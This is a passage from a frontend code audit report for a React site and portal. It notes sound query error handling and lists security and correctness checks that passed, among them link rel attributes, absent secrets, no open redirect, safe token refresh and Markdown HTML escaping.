  deliberately strip the markdown `<h1>` (`withoutH1` in
  [legalDocument.ts](apps/site/src/features/legal/legalDocument.ts#L39-L42)) to preserve that.
  Order is clean throughout.
- *`lang` switching* — correct on the site (FE-22 is a first-paint flash only), absent on the portal
  (FE-03).

**Unhandled query errors:** every page-level query is checked. `JobPage`, `OrderPage` and `SpecPage`
all follow `if (isLoading) return <Spinner/>; if (isError) return <p>{t('…loadError')}</p>`, and the
admin tables thread `isError` into the shared `Table`'s `state` prop. `ProtectedLayout` even
surfaces the `requestId` from `ApiError`. This is the strongest area of the codebase — the blank
screen risk in FE-05 comes from render throws, not from unhandled query errors.

---

## Verified-good

Things I specifically went looking for and did not find a problem with:

- **`rel` on external links.** All seven `target="_blank"` links carry `rel="noreferrer"`
  ([PaymentPanel.tsx](apps/portal/src/features/orders/PaymentPanel.tsx#L88),
  [ApprovalPanel.tsx](apps/portal/src/features/orders/ApprovalPanel.tsx#L59),
  [Deliverables.tsx](apps/portal/src/features/jobs/Deliverables.tsx#L36)). `noreferrer` implies
  `noopener` in every browser in support range, so `window.opener` tabnabbing is closed. Adding
  `noopener` explicitly is belt-and-braces, not a fix.
- **No secrets in the bundle.** `.env`, `.env.dev` and `.env.qa` for both apps contain only
  `VITE_APP_VERSION`, `VITE_API_URL=/bff` (relative — same-origin), titles, `VITE_PORTAL_URL`,
  `VITE_GITHUB_SIGNIN=1` and an intentionally empty `VITE_SENTRY_DSN` with a comment explaining why.
- **`/auth/github/callback` is not an open redirect.**
  [GithubCallbackPage.tsx](apps/portal/src/pages/GithubCallbackPage.tsx#L38) builds the target as
  `new URL(import.meta.env.VITE_API_URL + '/auth/github/callback', location.origin)`; with
  `VITE_API_URL=/bff` this always resolves same-origin, and only `code`/`state`/`error` are copied
  as query parameters — the destination is never attacker-influenced. The full-navigation approach
  (so the httpOnly state cookie travels) is the right call and is documented in the file.
- **Magic-link double-submission.** The `started` ref in
  [AuthCallbackPage.tsx](apps/portal/src/pages/AuthCallbackPage.tsx#L30-L39) correctly guards the
  single-use token against StrictMode's double-invoked effect — a real bug that this code already
  anticipates.
- **Session cache does not leak across users.**
  [sessionListeners.ts](apps/portal/src/features/session/sessionListeners.ts#L23-L29) dispatches
  `resetApiState()` on `clearSession` and `invalidateTags(['session'])` on `setTokens`, so the 8-hour
  `ApiCaching.long` on `getSession` cannot serve a previous user's data after logout or re-login.
  This is the kind of thing that is usually wrong; it is right here, and the comment at
  `sessionSlice.ts:41-43` explains the import-cycle reason for using a listener instead of
  `extraReducers` — worth preserving.
- **Token refresh concurrency.** The `async-mutex` guard in
  [api.ts](apps/portal/src/app/api.ts#L44-L81) correctly serialises refresh, makes concurrent 401s
  wait, and retries the original request. Clean.
- **Interval cleanup.** The only raw timer in either app is
  [ToastItem.tsx](apps/portal/src/features/toasts/ToastItem.tsx#L20-L23), which returns
  `clearTimeout`. Everything else uses RTK Query polling, which unsubscribes on unmount. No leaked
  intervals or subscriptions.
- **No controlled/uncontrolled input switches.** Every `value` prop traces to a `useState` seeded
  with `''` or a `?? ''` fallback; no `undefined` initial values anywhere.
- **React Compiler discipline.** Zero `useMemo`/`useCallback`/`React.memo` in either app, matching
  `react-tsx.instructions.md`. Derived values (`latestActive`, `canSend`, `dirty`, `trimmed`,
  `cancellable`, `nextStep`) are all computed in render rather than stored in state and synced by an
  Effect — the exact anti-pattern the rules call out, and it is absent.
- **Effects are only used for external-system sync.** The four Effects in the codebase are
  `document.title`/theme bootstrap, the toast timer, `usePageMeta`, and `SiteLayout`'s `lang` sync.
  None transform data for rendering, none chain, none pass data to a parent.
- **`useEffectOnce` honesty.** The hook's doc comment explicitly warns that StrictMode still runs it
  twice, and every caller that matters (`AuthCallbackPage`) guards accordingly.
- **Rapid-navigation races.** RTK Query's per-arg cache keys plus `skip` guards on empty ids mean
  switching orders/jobs quickly cannot render one order's data under another's route.
  `getJobEvents`' `serializeQueryArgs` keys on `jobId`, so logs do not cross-contaminate between
  jobs.
- **Public assets are lean.** `apps/site/public` is 52 kB total (favicon 4 kB SVG, `robots.txt`,
  `sitemap.xml`, locales); `apps/portal/public` is 48 kB. No unoptimised images, no bundled fonts.
- **Markdown raw-HTML escaping.** The `renderer.html` override in
  [markdown.ts](apps/site/src/build/markdown.ts#L30-L33) genuinely neutralises `<script>` and all
  raw HTML tokens, and rendering at build time means no Markdown parser ships to the browser. The
  gap is links only (FE-12), not the mechanism.
- **Locale parity tests are real tests**, not smoke tests — the `literal.size > 50` assertion
  prevents the regex from silently matching nothing, which is the usual way this class of test rots.
